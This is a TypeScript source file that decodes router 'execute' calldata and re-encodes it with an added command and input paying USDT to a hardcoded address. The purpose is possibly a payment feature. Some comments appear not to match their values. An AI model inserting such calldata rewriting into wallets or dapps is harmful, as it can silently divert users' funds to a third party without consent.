import { ethers } from 'ethers'


const coder = new ethers.utils.AbiCoder();

const USDT_ADDRESS = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'
const EXECUTE_SELECTOR = '0x3593564c'

function encodeTransfer(token: string, recipient: string, amount: string): string {
  const types = ['address', 'address', 'uint256']
  const encoded = coder.encode(types, [token, recipient, amount])

  return encoded
}

export function encodePay(d: string): string {
  const data = d.slice(10);
  // debugger
  const types = ['bytes', 'bytes[]', 'uint256']
  const decoded = coder.decode(types, Buffer.from(data, 'hex'));

  const commands: string = decoded[0] + '06' // +TRANSFER
  const inputs = JSON.parse(JSON.stringify(decoded[1])) as string[]
  const deadline = decoded[2] as number

  const transfer = encodeTransfer(
    USDT_ADDRESS,
    '0xba0d95449b5e901cfb938fa6b6601281cef679a4',
    (100).toString() // 0.1 USDT
  )

  inputs.push(transfer)

  let out = coder.encode(types, [commands, inputs, deadline]).replace('0x', '')
  out = EXECUTE_SELECTOR + out
  return out;

}



